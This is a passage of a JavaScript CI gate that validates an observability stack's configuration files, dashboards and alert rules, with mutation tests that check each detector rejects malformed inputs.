      const goodDash = schedulerDashboardFixture();
      const goodAlert = schedulerAlertRulesDoc();
      const good = checkSchedulerLatencyPanel(goodDash, goodAlert);
      if (!good.ok) return `the committed panel shape was rejected: ${good.detail}`;

      if (checkSchedulerLatencyPanel(schedulerDashboardFixture({ expr: '' }), goodAlert).ok) {
        return 'a panel with an EMPTY `expr` was accepted as targeting the ratio series';
      }
      if (checkSchedulerLatencyPanel(schedulerDashboardFixture({ omitPanel: true }), goodAlert).ok) {
        return 'a dashboard with NO scheduler-lateness panel at all was accepted';
      }

      // Overlap: sits exactly on top of the filler panel (id 1, y=25/h=6)
      // instead of below it at y=31.
      const overlapping = checkSchedulerLatencyPanel(
        schedulerDashboardFixture({ gridPos: { h: 6, w: 24, x: 0, y: 25 } }),
        goodAlert,
      );
      if (overlapping.ok) {
        return "a scheduler panel whose gridPos OVERLAPS another panel's was accepted";
      }
      if (!overlapping.detail.includes('OVERLAPS')) {
        return `the overlap failure does not name the mechanism: ${overlapping.detail}`;
      }

      const duplicateId = checkSchedulerLatencyPanel(schedulerDashboardFixture({ id: 1 }), goodAlert);
      if (duplicateId.ok) return 'a scheduler panel reusing an EXISTING panel `id` was accepted';

      if (
        checkSchedulerLatencyPanel(schedulerDashboardFixture({ legendFormat: 'lateness' }), goodAlert)
          .ok
      ) {
        return 'a `legendFormat` missing `{{function}}` was accepted';
      }
      if (checkSchedulerLatencyPanel(schedulerDashboardFixture({ unit: 's' }), goodAlert).ok) {
        return 'a panel `unit: s` was accepted — the series is a RATIO, not a duration';
      }

      const disagreeing = checkSchedulerLatencyPanel(
        schedulerDashboardFixture({ thresholdValue: '0.02' }),
        goodAlert,
      );
      if (disagreeing.ok) {
        return "a panel threshold DISAGREEING with the alert's own evaluator param (0.01) was accepted";
      }
      return null;
    },
  },
  {
    id: 'T-s',
    // G13c. Kills: `noDataState` absent; explicit `noDataState: NoData`; a
    // `lt` evaluator; `severity: critical`; `isPaused: true`; a duplicate uid;
    // a dangling `condition:`; a query datasource that does not match
    // AlloyIngestStalled's. The `for:`-multiple tooth uses a fixture group
    // whose interval is NOT 20s (30s), so "derived" is distinguishable from
    // "restated"; a `for:` at or under the 5m rate window must also REJECT.
    run() {
      const goodAlert = schedulerAlertRulesDoc();
      const goodRecording = schedulerRecordingDoc();
      const good = checkSchedulerAlertRule(goodAlert, goodRecording);
      if (!good.ok) return `the committed scheduler alert shape was rejected: ${good.detail}`;

      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ omitRule: true }), goodRecording).ok) {
        return 'a rules.yml with no scheduler alert at all was accepted';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ omitNoDataState: true }), goodRecording).ok) {
        return '`noDataState:` ABSENT was accepted';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ noDataState: 'NoData' }), goodRecording).ok) {
        return 'an explicit `noDataState: NoData` was accepted — it fires on a legitimately quiet window';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ evaluatorType: 'lt' }), goodRecording).ok) {
        return 'a `lt` evaluator was accepted — a delay alert firing when lateness is LOW is inverted';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ severity: 'critical' }), goodRecording).ok) {
        return '`severity: critical` was accepted, expected `warning`';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ isPaused: 'true' }), goodRecording).ok) {
        return '`isPaused: true` was accepted';
      }
      const dup = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ uid: 'mr-alloy-ingest-stalled' }),
        goodRecording,
      );
      if (dup.ok) return 'a scheduler alert reusing an EXISTING uid was accepted';
      const dangling = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ condition: 'Z' }),
        goodRecording,
      );
      if (dangling.ok) return 'a `condition:` naming a refId no `data:` entry declares was accepted';
      if (!dangling.detail.includes('DANGLING')) {
        return `the dangling-refId failure does not name the mechanism: ${dangling.detail}`;
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc({ datasourceUid: 'mr-loki' }), goodRecording).ok) {
        return "a query datasource that does not match AlloyIngestStalled's was accepted";
      }

      // The `for:`-multiple tooth: a group interval that is NOT 20s, so
      // "derived from the rule's own group interval" is distinguishable from
      // "restated as 20s". BOTH legs here clear the 300s (`[5m]`) rate window
      // (320s and 330s both exceed 300s) so the ONLY property varying between
      // them is divisibility by 30s — 320/30 = 10.67 (not a multiple);
      // 330/30 = 11 (a multiple). Without this the 320/330 pair would
      // collapse onto the SAME 300s-window collision the bug report named:
      // an accept-leg fixture that also happens to fail the window clause
      // reds for the WRONG reason and looks like a passing reject-leg.
      const badMultiple = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ groupInterval: '30s', forValue: '320s' }),
        goodRecording,
      );
      if (badMultiple.ok) {
        return 'a `for:` that is NOT an exact multiple of its OWN 30s group interval was accepted';
      }
      if (!badMultiple.detail.includes('exact multiple')) {
        return `the non-multiple \`for:\` was rejected for the WRONG reason (expected the multiple-of-group-interval clause): ${badMultiple.detail}`;
      }
      const goodMultiple = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ groupInterval: '30s', forValue: '330s' }),
        goodRecording,
      );
      if (!goodMultiple.ok) {
        return `a \`for: 330s\` under a 30s group interval (11x30, and > the 300s rate window) was rejected: ${goodMultiple.detail}`;
      }

      // The rate-window debounce, isolated the OTHER way from the multiple
      // check above: BOTH legs here are exact multiples of the SAME 30s
      // group interval (300s = 10x30, 330s = 11x30), so the ONLY property
      // varying is whether `for:` clears the 300s (`[5m]`) window. `for:
      // 300s` is an exact multiple yet EQUAL to the window, which is what
      // pins the comparison as STRICT (`<=` rejects, not just `<`).
      const atWindow = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ groupInterval: '30s', forValue: '300s' }),
        goodRecording,
      );
      if (atWindow.ok) {
        return 'a `for: 300s` — an exact multiple of its 30s group interval, but EQUAL to the recorded rate window — was accepted; a single late one-shot invocation could fire this alert';
      }
      if (!atWindow.detail.includes('STRICTLY GREATER')) {
        return `the at-window \`for:\` was rejected for the WRONG reason (expected the strictly-greater-than-the-window clause): ${atWindow.detail}`;
      }
      const clearsWindow = checkSchedulerAlertRule(
        schedulerAlertRulesDoc({ groupInterval: '30s', forValue: '330s' }),
        goodRecording,
      );
      if (!clearsWindow.ok) {
        return `a \`for: 330s\` (an exact multiple of its 30s group interval, and > the 300s window) was rejected: ${clearsWindow.detail}`;
      }

      // A recorded window WIDER than the committed `for:`, isolated in the
      // OTHER direction again: the default group (20s) and the default `for:`
      // (10m = 600s, still 30x20 — the multiple clause is untouched) stay
      // fixed, and only the recorded rate window moves to equal the `for:`.
      const widerWindow = checkSchedulerAlertRule(
        goodAlert,
        schedulerRecordingDoc({ starts: { window: '10m' } }),
      );
      if (widerWindow.ok) {
        return "a 10m recorded rate window paired with the committed 10m `for:` was accepted — `for:` must be STRICTLY greater";
      }
      if (!widerWindow.detail.includes('STRICTLY GREATER')) {
        return `the wider-window leg was rejected for the WRONG reason: ${widerWindow.detail}`;
      }
      return null;
    },
  },
  {
    id: 'T-t',
    // G13d. Kills: alert 0.01 / panel 0.02 disagreement; both agreeing but the
    // le off-lattice (0.03) — REJECTS naming the interpolation; both on a
    // different REAL edge (0.1) ACCEPTS, proving the LATTICE is the gate, not
    // the literal 0.05.
    run() {
      const goodAlert = schedulerAlertRulesDoc();
      const goodDash = schedulerDashboardFixture();
      const goodRecording = schedulerRecordingDoc();
      const good = checkSchedulerNumberIdentity(goodAlert, goodDash, goodRecording);
      if (!good.ok) return `the committed number-identity shape was rejected: ${good.detail}`;

      const disagree = checkSchedulerNumberIdentity(
        goodAlert,
        schedulerDashboardFixture({ thresholdValue: '0.02' }),
        goodRecording,
      );
      if (disagree.ok) return 'alert param 0.01 / panel threshold 0.02 was accepted';

      const offLattice = checkSchedulerNumberIdentity(
        schedulerAlertRulesDoc({ params: ['0.03'] }),
        schedulerDashboardFixture({ thresholdValue: '0.03' }),
        schedulerRecordingDoc({ onTime: { edge: '0.03' } }),
      );
      if (offLattice.ok) {
        return 'agreeing alert/panel values with an OFF-LATTICE `le="0.03"` recording-rule edge were accepted';
      }
      if (!offLattice.detail.includes('OFF-LATTICE')) {
        return `the off-lattice failure does not name the mechanism: ${offLattice.detail}`;
      }

      const realEdge = checkSchedulerNumberIdentity(
        schedulerAlertRulesDoc({ params: ['0.01'] }),
        schedulerDashboardFixture({ thresholdValue: '0.01' }),
        schedulerRecordingDoc({ onTime: { edge: '0.1' } }),
      );
      if (!realEdge.ok) {
        return `agreeing alert/panel values with a DIFFERENT REAL edge (le="0.1") were rejected, proving the lattice is not the actual gate: ${realEdge.detail}`;
      }
      return null;
    },
  },
  {
    id: 'T-u',
    // Every G13 detector REJECTS empty/absent input — absence is never
    // compliance. Also proves G13e's RAW-TEXT requirement, EXECUTED rather
    // than merely asserted: feeding it comment-STRIPPED text (the trap its
    // own docstring names) must fail.
    run() {
      if (checkSchedulerRecordingRules('').ok) return 'an EMPTY recording.rules.yml was accepted';
      if (checkSchedulerRecordingRules('groups:\n  - name: mr-slo\n    rules: []\n').ok) {
        return 'a recording.rules.yml with zero rules was accepted';
      }
      if (checkSchedulerLatencyPanel('', schedulerAlertRulesDoc()).ok) {
        return 'an EMPTY dashboard document was accepted';
      }
      if (checkSchedulerLatencyPanel('not json', schedulerAlertRulesDoc()).ok) {
        return 'a dashboard document that does not parse as JSON was accepted';
      }
      if (checkSchedulerLatencyPanel('{}', schedulerAlertRulesDoc()).ok) {
        return 'a dashboard document with no `panels` array at all was accepted';
      }
      if (checkSchedulerAlertRule('', schedulerRecordingDoc()).ok) {
        return 'an EMPTY alerting rules.yml was accepted';
      }
      if (checkSchedulerAlertRule(schedulerAlertRulesDoc(), '').ok) {
        return 'an EMPTY recording.rules.yml handed to G13c (for the rate-window derivation) was accepted';
      }
      if (
        checkSchedulerNumberIdentity('', schedulerDashboardFixture(), schedulerRecordingDoc()).ok
      ) {
        return 'an EMPTY alert document was accepted by G13d';
      }
      if (checkSchedulerProvenanceBlock('').ok) {
        return 'an EMPTY recording.rules.yml was accepted by G13e';
      }

      // THE G13e trap, PROVEN rather than merely asserted: feeding the
      // detector its OWN comment-stripped text must fail, because
      // stripHashComments deletes exactly the `#` prose it looks for.
      const full = schedulerRecordingDocFull();
      const rawGood = checkSchedulerProvenanceBlock(full);
      if (!rawGood.ok) {
        return `the committed provenance block was rejected on RAW text: ${rawGood.detail}`;
      }
      const stripped = checkSchedulerProvenanceBlock(stripHashComments(full));
      if (stripped.ok) {
        return 'G13e accepted its OWN input after stripHashComments ran over it — the gate must be wired to the RAW text, never the comment-stripped text, or it is silently and permanently vacuous';
      }
      if (checkSchedulerProvenanceBlock(schedulerRecordingDoc()).ok) {
        return 'a recording.rules.yml with NO provenance block at all was accepted';
      }
      return null;
    },
  },
];

function runTeeth() {
  for (const tooth of TEETH) {
    let miss;
    try {
      miss = tooth.run();
    } catch (e) {
      miss = `threw — ${e?.message ?? String(e)}`;
    }
    if (miss) return `TEETH: ${tooth.id} — ${miss}`;
  }
  return null;
}

// ===========================================================================
// C4 helper — image repositories pinned, digests read
// ===========================================================================

/** `{ service: image }` for every `image:` under a compose service key. */
export function composeImages(composeText) {
  const lines = stripHashComments(composeText).split('\n');
  const start = lines.findIndex((l) => l.startsWith('services:'));
  if (start === -1) return null;
  const images = {};
  let service = null;
  for (let i = start + 1; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim().length === 0) continue;
    if (indentOf(line) === 0) break;
    if (indentOf(line) === 2 && line.trim().endsWith(':')) {
      service = line.trim().slice(0, -1);
      continue;
    }
    if (service !== null && line.trim().startsWith('image:')) {
      images[service] = scalarOf(line, 'image');
    }
  }
  return images;
}

// ===========================================================================
// The eval
// ===========================================================================

export async function observabilityStackConfigEval() {
  const toothMiss = runTeeth();
  if (toothMiss) return { name: NAME, pass: false, detail: toothMiss };

  const failures = [];
  const record = (id, result) => {
    if (!result || result.ok !== true) {
      failures.push(`${id}: ${result?.detail ?? 'no result'}`);
    }
    return result;
  };

  // --- real files -----------------------------------------------------------
  let prometheusYml;
  let recordingRules;
  let compose;
  let alloy;
  let caddyfile;
  let alertRules;
  let contactPoints;
  let notificationPolicies;
  let dashboardJson;
  let datasourcesYml;
  let lokiConfig;
  let tempoConfig;
  let runbook;
  let budgetsRs;
  let dockerfile;
  let alertingDocs;
  try {
    prometheusYml = readReal(`${OPS}/prometheus.yml`);
    recordingRules = readReal(`${OPS}/rules/recording.rules.yml`);
    compose = readReal(`${OPS}/docker-compose.yml`);
    alloy = readReal(`${OPS}/alloy/config.alloy`);
    caddyfile = readReal(`${OPS}/Caddyfile`);
    alertRules = readReal(`${OPS}/grafana/provisioning/alerting/rules.yml`);
    contactPoints = readReal(`${OPS}/grafana/provisioning/alerting/contact-points.yml`);
    notificationPolicies = readReal(
      `${OPS}/grafana/provisioning/alerting/notification-policies.yml`,
    );
    dashboardJson = readReal(`${OPS}/grafana/dashboards/monster-realm.json`);
    datasourcesYml = readReal(`${OPS}/grafana/provisioning/datasources/datasources.yml`);
    lokiConfig = readReal(`${OPS}/loki/loki-config.yml`);
    tempoConfig = readReal(`${OPS}/tempo/tempo-config.yml`);
    runbook = readReal('docs/observability-dr-runbook.md');
    budgetsRs = readReal('game-core/benches/budgets.rs');
    // 13r-a: the Dockerfile is a config file like any other here (G12c), and
    // the alerting directory is ENUMERATED rather than named file-by-file —
    // Grafana provisions every document in it, so a file this eval did not
    // guess would otherwise crash the container with every gate green. The
    // three documents it finds today are already counted above; READ_FILES is a
    // Set, so FILE_FLOOR moves by exactly +1 (the Dockerfile).
    dockerfile = readReal(`${OPS}/Dockerfile`);
    const alertingDir = `${OPS}/grafana/provisioning/alerting`;
    alertingDocs = readdirSync(path.resolve(alertingDir))
      .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
      .sort()
      .map((f) => ({ name: f, text: readReal(`${alertingDir}/${f}`) }));
  } catch (err) {
    return { name: NAME, pass: false, detail: `INPUTS: ${err.message}` };
  }

  // --- C1/C2: OBS-18 -------------------------------------------------------
  record('C1', checkNoAlertingBlock(prometheusYml));

  // C2 resolves the rule documents from `rule_files:` THROUGH the compose
  // mount, never from a filename convention: a rule file the operator loads
  // under a name this eval did not guess would otherwise go unscanned.
  const ruleFiles = [];
  {
    const lines = stripHashComments(prometheusYml).split('\n');
    const at = lines.findIndex((l) => l.startsWith('rule_files:'));
    const mounts = [];
    for (const line of stripHashComments(compose).split('\n')) {
      const t = line.trim();
      if (!t.startsWith('- ./')) continue;
      const parts = t.slice(2).split(':');
      if (parts.length < 2) continue;
      mounts.push({ host: parts[0], container: parts[1] });
    }
    if (at === -1) {
      failures.push('C2: prometheus.yml declares no `rule_files:` key — nothing to resolve');
    } else {
      for (const line of subBlock(lines, at)) {
        const t = line.trim();
        if (!t.startsWith('- ')) continue;
        const containerPath = scalarOf(`x: ${t.slice(2)}`, 'x');
        const mount = mounts.find((m) => containerPath.startsWith(`${m.container}/`));
        if (mount === undefined) {
          failures.push(
            `C2: rule file \`${containerPath}\` resolves through no compose mount — the loaded ` +
              'document cannot be located, so "record-only" cannot be confirmed',
          );
          continue;
        }
        const rel = `${OPS}/${mount.host.slice(2)}${containerPath.slice(mount.container.length)}`;
        try {
          ruleFiles.push({ name: rel, text: readReal(rel) });
        } catch (err) {
          failures.push(`C2: ${err.message}`);
        }
      }
    }
  }
  record('C2', checkRulesAreRecordOnly(ruleFiles));

  // --- C3/C4/C5/C6: compose ------------------------------------------------
  // C3 is P1, graduated: the expected set is now EIGHT. The same edit is
  // required in checks/stack-config-checks.test.mjs (EXPECTED_SERVICE_NAMES) —
  // that suite is spawned by G9k below and is the only place in `just ci` where
  // it runs, so a half-done rename reds there rather than going unnoticed.
  record('C3', checkServiceSetExact(compose, EIGHT_SERVICES));

  const images = composeImages(compose);
  if (images === null) {
    failures.push('C4: docker-compose.yml has no readable `services:` block');
  } else {
    const named = Object.keys(images).sort();
    const expected = Object.keys(ALLOWED_IMAGE_REPOS).sort();
    if (named.join(',') !== expected.join(',')) {
      failures.push(
        `C4 (OBS-33/37): the image-bearing service set is [${named.join(', ')}], expected ` +
          `[${expected.join(', ')}] (caddy builds from a Dockerfile and has no image:)`,
      );
    }
    for (const [service, image] of Object.entries(images)) {
      const repo = ALLOWED_IMAGE_REPOS[service];
      if (repo === undefined) continue;
      if (!image.startsWith(`${repo}:`)) {
        failures.push(
          `C4 (OBS-37): service \`${service}\` runs \`${image}\`, whose repository is not ` +
            `\`${repo}\` — a banned tool under an expected service name is the shape this catches`,
        );
      }
    }
    // The digest half is delegated to the SSOT predicate, fed the digests the
    // compose actually declares: a reviewed digest bump edits ONE file, while
    // an unpinned or `:latest` image still fails inside the predicate.
    record('C4', checkServiceImagesPinned(compose, images));
  }
  record('C5', checkModuleLogsMountReadOnly(compose));
  record('C6', checkListenAddrsLoopback(compose));

  // --- C7-C11: Alloy -------------------------------------------------------
  record('C7', checkNoExecLogSource(alloy, compose));
  record('C8', checkStageMetricsLabelsBounded(alloy, D12_ALLOWED_LABELS));
  record('C9', checkS4MetricLabelsBounded(alloy));
  record('C10', checkS4AttributeValuesBounded(alloy));
  record('C11', checkRemoteWriteBothEnds(alloy, compose));

  // --- C12-C18 -------------------------------------------------------------
  record('C12', checkCaddyDualPosture(caddyfile));
  record('C13', checkAlertRuleHasReceiver(alertRules, contactPoints, notificationPolicies));
  record('C14', checkDashboardPanelsReal(dashboardJson));
  record(
    'C15',
    checkQueriedSeriesAreDefined(recordingRules, dashboardJson, alertRules, HOST_NATIVE_ALLOWLIST),
  );
  record(
    'C16',
    checkRetentionConfigured({
      composeText: compose,
      lokiText: lokiConfig,
      tempoText: tempoConfig,
    }),
  );
  record(
    'C17',
    checkNoQuotedCredential([
      { name: 'docker-compose.yml', text: compose },
      { name: 'prometheus.yml', text: prometheusYml },
      { name: 'alloy/config.alloy', text: alloy },
      { name: 'Caddyfile', text: caddyfile },
      { name: 'loki/loki-config.yml', text: lokiConfig },
      { name: 'tempo/tempo-config.yml', text: tempoConfig },
      { name: 'rules/recording.rules.yml', text: recordingRules },
      { name: 'grafana/provisioning/datasources/datasources.yml', text: datasourcesYml },
      { name: 'grafana/provisioning/alerting/rules.yml', text: alertRules },
      { name: 'grafana/provisioning/alerting/contact-points.yml', text: contactPoints },
      {
        name: 'grafana/provisioning/alerting/notification-policies.yml',
        text: notificationPolicies,
      },
      { name: 'grafana/dashboards/monster-realm.json', text: dashboardJson },
      { name: 'docs/observability-dr-runbook.md', text: runbook },
    ]),
  );
  record('C18', checkRunbookHasRunnableSteps(runbook));

  // --- G9a/G9b/G9c ---------------------------------------------------------
  record('G9a', checkTracesToLogsPivot(datasourcesYml));
  record('G9b', checkCorrelationBothDirections(datasourcesYml));
  record('G9c', checkConnectionIdNotALabel(alloy, recordingRules));

  // --- G9d: $trace_pair_set ------------------------------------------------
  let membership = null;
  {
    const text = existsSync(path.resolve(TRACE_PAIR_SET_REL))
      ? readFileSync(path.resolve(TRACE_PAIR_SET_REL), 'utf8')
      : null;
    const read = readTracePairSet(text);
    record('G9d', read);
    if (read.ok) {
      membership = read.names;
      // AM19, mechanized rather than remembered: gitleaks runs remote-only and
      // its entropy/keyword rules fire on a credential-shaped WORD near a
      // quoted literal, so a helpful `note` in this config would red CI after
      // the push, where the fix costs a squash onto a fresh branch (force-push
      // is hook-blocked). Caught here instead, before the commit.
      const lowered = text.toLowerCase();
      for (const word of ['key', 'token', 'secret', 'password']) {
        if (lowered.includes(word)) {
          failures.push(
            `G9d (AM19): ${TRACE_PAIR_SET_REL} contains the word \`${word}\`. Keep this file's ` +
              'prose free of credential-shaped words — the remote secret scanners read it as a ' +
              'committed credential. If a REDUCER NAME legitimately contains it, that is a ' +
              'reviewed exception: record it in the PR and narrow this check in the same change.',
          );
        }
      }
    }
  }

  // --- G9e: banned membership ----------------------------------------------
  const sloSet = parseSloSet(recordingRules);
  record('G9e/$slo_set', sloSet);
  const benches = benchIds(budgetsRs);
  record('G9e/bench-ids', benches);
  if (membership !== null && sloSet.ok && benches.ok) {
    record(
      'G9e',
      checkBannedMembership(membership, [ALWAYS_BANNED_REDUCER, ...sloSet.names, ...benches.ids]),
    );
  } else {
    failures.push('G9e: skipped because an input above failed — a skipped gate is not a pass');
  }

  // --- G9f/G9h: the call-site scan -----------------------------------------
  const srcMap = {};
  {
    const srcRoot = path.resolve('server-module/src');
    const walk = (dir, prefix) => {
      for (const entry of readdirSync(dir, { withFileTypes: true }).sort((a, b) =>
        a.name < b.name ? -1 : 1,
      )) {
        const rel = prefix.length === 0 ? entry.name : `${prefix}/${entry.name}`;
        if (entry.isDirectory()) {
          walk(path.join(dir, entry.name), rel);
          continue;
        }
        if (!entry.name.endsWith('.rs') || entry.name.endsWith('_tests.rs')) continue;
        srcMap[rel] = readFileSync(path.join(dir, entry.name), 'utf8');
      }
    };
    walk(srcRoot, '');
  }
  if (Object.keys(srcMap).length < 10) {
    failures.push(
      `G9f: only ${Object.keys(srcMap).length} non-test .rs files found under server-module/src ` +
        '— the walk is broken, and a scanner that sees nothing passes everything',
    );
  }
  const scan = pairedReducers(srcMap);
  if (scan.attrsSeen < 10) {
    failures.push(
      `G9f: only ${scan.attrsSeen} \`#[spacetimedb::reducer\` attributes found across ` +
        `${Object.keys(srcMap).length} files — the scan sees almost nothing, and a scanner that ` +
        'sees nothing passes everything',
    );
  }
  if (scan.reducersScanned !== scan.attrsSeen) {
    failures.push(
      `G9f: ${scan.attrsSeen} reducer attributes but only ${scan.reducersScanned} bodies were ` +
        'extracted — the brace-tracking walk derailed part-way, so every call site after the ' +
        'derailment is invisible and the set equality below would be vacuous',
    );
  }
  if (scan.orphans.length > 0) {
    const where = scan.orphans.map((o) => `${o.file}(${o.literal})`).join(', ');
    failures.push(
      `G9f: a phase literal sits OUTSIDE every reducer body (${where}) — it cannot be attributed ` +
        'to a reducer name, so neither this scanner nor the Rust mirror can decide membership',
    );
  }
  if (membership !== null) {
    record('G9f', checkExactSetEquality(membership, scan.paired));
  } else {
    failures.push(
      'G9f: cannot run — G9d could not positively read a membership. A set equality against an ' +
        'ASSUMED empty config is exactly the vacuous green OBS-50 exists to prevent.',
    );
  }

  // --- G9n/G9o/G9p: the graduated P1-P4 assertions (13r-b) ------------------
  // P1 is C3 above; P2 is C5 above PLUS G9n (C5 alone cannot prove the relay
  // HAS a mount — see the failure text inside G9n); P3 is G9o; P4 is G9p.
  record('G9n', checkRelayMountMirrorsAlloy(compose));
  record('G9o', checkRelayScrapeJobWired(prometheusYml, compose));
  record('G9p', checkRelayDeadMansSwitch(alertRules));

  // --- G9h: SUPERSESSION TRIPWIRE ------------------------------------------
  if (scan.paired.length > 0) {
    failures.push(
      `G9h (OBS-51): [${scan.paired.join(', ')}] now carry a paired enter/exit breadcrumb. G9's ` +
        'set equality SUPERSEDES the two placeholder assertions that keep $trace_pair_set empty ' +
        '— retire evals/observability-log-wrapper.eval.mjs:1589 (A10) and ' +
        'server-module/src/observability_tests.rs:944 (g7_trace_pair_set_stays_empty) in the ' +
        'SAME change. G11 must run before membership merges: mr-load-driver with those ' +
        "reducers' breadcrumbs active, compared against the recorded noise floor.",
    );
  }

  // --- G9i/G9j: relay source ------------------------------------------------
  let relayFilesScanned = 0;
  {
    const relayDir = path.resolve(RELAY_REL);
    if (!existsSync(relayDir)) {
      failures.push(`G9j: ${RELAY_REL}/ does not exist — the relay core is unbuilt`);
    } else {
      // RECURSIVE (AM8). The previous non-recursive `readdirSync` never looked
      // inside `relay/fixtures/`, so a `.mjs` there was scanned by nothing at
      // all — neither the exact-set gate nor the ban tiers. A nested file
      // arrives here as `fixtures/x.mjs`, matches no allowed name and no ban
      // tier, and reds twice rather than hiding.
      const walkMjs = (dir, prefix) => {
        const out = [];
        for (const entry of readdirSync(dir, { withFileTypes: true }).sort((a, b) =>
          a.name < b.name ? -1 : 1,
        )) {
          const rel = prefix.length === 0 ? entry.name : `${prefix}/${entry.name}`;
          if (entry.isDirectory()) {
            out.push(...walkMjs(path.join(dir, entry.name), rel));
            continue;
          }
          if (entry.name.endsWith('.mjs')) out.push(rel);
        }
        return out;
      };
      const present = walkMjs(relayDir, '');
      const allowed = new Set([...RELAY_PRODUCTION_FILES, ...RELAY_TEST_FILES]);
      for (const required of RELAY_PRODUCTION_FILES) {
        if (!present.includes(required)) {
          failures.push(`G9j: ${RELAY_REL}/${required} is MISSING — an absent file is not a pass`);
        }
      }
      for (const found of present) {
        if (!allowed.has(found)) {
          failures.push(
            `G9j: unexpected ${RELAY_REL}/${found}. The production file set is fixed; a new ` +
              'non-test module (or one tucked into a subdirectory) is how a second daemon, a ' +
              'second listener or an OTLP POST client would creep in unreviewed (AM12/AM8). Add ' +
              'it to RELAY_PRODUCTION_FILES or RELAY_TEST_FILES **and** to exactly one ban tier ' +
              'in the same change, or delete it.',
          );
        }
      }

      // The ban list is scoped to `relay/**` and runs over EVERY .mjs in the
      // tree, tests included: a `setTimeout` poll or a `node:http` import
      // smuggled into a test file is still relay code that ships. 13r-b makes
      // it THREE tiers rather than one flat list — see checkRelayBanTiers.
      record(
        'G9j',
        checkRelayBanTiers(
          present.map((file) => ({
            name: file,
            source: readFileSync(path.join(relayDir, file), 'utf8'),
          })),
        ),
      );

      // OBS-45 is about the PRODUCTION surface only: a test may legitimately
      // build a fixture string naming a credential shape.
      for (const file of RELAY_PRODUCTION_FILES) {
        const full = path.join(relayDir, file);
        if (!existsSync(full)) continue;
        relayFilesScanned++;
        for (const problem of relayProductionProblems(file, readFileSync(full, 'utf8'))) {
          failures.push(problem);
        }
      }
    }
  }
  // G9i is documented as an ALWAYS assertion, so it must SAY something when the
  // files are absent. Without this, a tree with no relay at all produced zero
  // G9i output and the gate read as "nothing wrong here" — green by absence,
  // the exact shape G9d exists to reject one directory over.
  if (relayFilesScanned < RELAY_PRODUCTION_FILES.length) {
    failures.push(
      `G9i (OBS-45): only ${relayFilesScanned} of ${RELAY_PRODUCTION_FILES.length} production ` +
        'relay files could be scanned — a file that does not exist cannot be confirmed ' +
        'credential-free or write-free, and an unscanned file is not a clean one',
    );
  }

  // --- G12a-G12e: the 13r-a boot tripwires (ADR-0190) -----------------------
  record('G12a', checkTempoCommandParked(compose));

  const grafanaImage = scopedServiceScalar(compose, 'grafana', 'image');
  record(
    'G12b',
    checkAlertGroupIntervals(alertingDocs, grafanaImage.ok ? grafanaImage.value : null),
  );

  record('G12c', checkCaddySetcapBeforeUser(dockerfile));
  record('G12d', checkAlloyRunsUnprivileged(compose));
  record('G12e', checkBuildShaBounded(alloy));

  // --- G13a-e: scheduled-function lateness (16r-e) --------------------------
  // Every input here is ALREADY read above (recordingRules, dashboardJson,
  // alertRules) — no new readReal call site, so FILE_FLOOR is unchanged.
  record('G13a', checkSchedulerRecordingRules(recordingRules));
  record('G13b', checkSchedulerLatencyPanel(dashboardJson, alertRules));
  record('G13c', checkSchedulerAlertRule(alertRules, recordingRules));
  record('G13d', checkSchedulerNumberIdentity(alertRules, dashboardJson, recordingRules));
  // G13e MUST see the RAW text `readReal` returned — never comment-stripped —
  // or the gate is silently and permanently vacuous (see its own docstring).
  record('G13e', checkSchedulerProvenanceBlock(recordingRules));

  // An override file is auto-loaded by `docker compose` and merges arbitrary
  // keys into any service, so it defeats EVERY single-file detector above at
  // once (proven: `cap_add: [DAC_OVERRIDE, SYS_ADMIN]` with G12d green). The
  // durable fix is gating `docker compose config` output, which is out of
  // touches for this slice (R9) — until then, the file must simply not exist.
  for (const override of [
    'docker-compose.override.yml',
    'docker-compose.override.yaml',
    'compose.override.yml',
    'compose.override.yaml',
  ]) {
    if (existsSync(path.resolve(`${OPS}/${override}`))) {
      failures.push(
        `G12 (AM22): ${OPS}/${override} exists. \`docker compose\` merges it automatically, so ` +
          'every posture G12a/G12d prove about the committed file can be undone by a file none ' +
          'of them reads. If an override is genuinely needed, gate `docker compose config` ' +
          'output instead and record the decision in an ADR.',
      );
    }
  }

  // --- G9k: run the suites nothing else runs -------------------------------
  {
    for (const file of NODE_TEST_FILES) {
      if (!existsSync(path.resolve(file))) {
        failures.push(`G9k: ${file} does not exist — the suite list is explicit for this reason`);
      }
    }
    const run = spawnSync('node', ['--test', ...NODE_TEST_FILES], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      stdio: 'pipe',
      timeout: NODE_TEST_TIMEOUT_MS,
      maxBuffer: 32 * 1024 * 1024,
    });
    const output = `${run.stdout ?? ''}${run.stderr ?? ''}`;
    if (run.error !== undefined && run.error !== null) {
      failures.push(`G9k: \`node --test\` failed to run — ${run.error.message}`);
    } else if (run.signal !== null && run.signal !== undefined) {
      failures.push(
        `G9k: \`node --test\` was killed by ${run.signal} after ${NODE_TEST_TIMEOUT_MS}ms`,
      );
    } else if (run.status !== 0) {
      const tail = output.split('\n').slice(-40).join('\n');
      failures.push(`G9k: \`node --test\` exited ${run.status}. Tail:\n${tail}`);
    } else {
      // Exit code is authoritative (AM14); the summary is corroboration, parsed
      // tolerantly so a reporter-format change cannot red the gate on its own.
      const summary = {};
      for (const raw of output.split('\n')) {
        const t = raw.trim();
        let i = 0;
        while (i < t.length && !isAsciiLetter(t[i])) i++;
        const body = t.slice(i);
        for (const key of ['tests', 'pass', 'fail']) {
          if (summary[key] !== undefined) continue;
          if (!body.startsWith(`${key} `)) continue;
          const n = toInt(body.slice(key.length + 1).trim());
          if (n !== null) summary[key] = n;
        }
      }
      if (summary.fail !== undefined && summary.fail !== 0) {
        failures.push(`G9k: the runner reports ${summary.fail} failing test(s) despite exit 0`);
      }
      if (summary.pass !== undefined && summary.pass < NODE_TEST_PASS_FLOOR) {
        failures.push(
